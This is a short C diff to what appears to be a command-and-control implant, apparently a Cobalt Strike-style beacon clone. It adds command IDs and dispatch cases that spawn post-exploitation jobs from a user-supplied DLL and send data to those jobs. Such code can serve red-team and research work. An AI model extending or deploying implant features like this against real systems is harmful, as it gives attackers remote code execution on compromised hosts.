@@ -122,6 +122,12 @@
 #define COMMAND_DATA_STORE             115
 #define COMMAND_DATA_STORE_INLINE_EXECUTE_OBJECT 116
 #define COMMAND_DATA_STORE_EXECUTE_ASSEMBLY 117
+/* tier-2 item5 (4.10 execute-dll parity): postex job spawn with a user
+ * DLL + parameter blob, and bjob_send_data pipe writes. Our extension
+ * ids (0x76-0x78); official 4.10 numbers unknown, both ends are ours. */
+#define COMMAND_JOB_SPAWN_USER_X86 0x76
+#define COMMAND_JOB_SPAWN_USER_X64 0x77
+#define COMMAND_JOB_DATA           0x78
 
 typedef struct {
 	unsigned int   type;
@@ -457,6 +463,15 @@ void process_message(unsigned int type, char * buffer, int length) {
 		break;
 	case COMMAND_DATA_STORE_EXECUTE_ASSEMBLY:
 		command_data_store_execute_assembly(buffer, length, TRUE, TRUE);
+		break;
+	case COMMAND_JOB_SPAWN_USER_X86:
+		command_job_spawn_user(buffer, length, TRUE);
+		break;
+	case COMMAND_JOB_SPAWN_USER_X64:
+	command_job_spawn_user(buffer, length, FALSE);
+		break;
+	case COMMAND_JOB_DATA:
+		command_job_data(buffer, length);
 		break;
 	}
 }
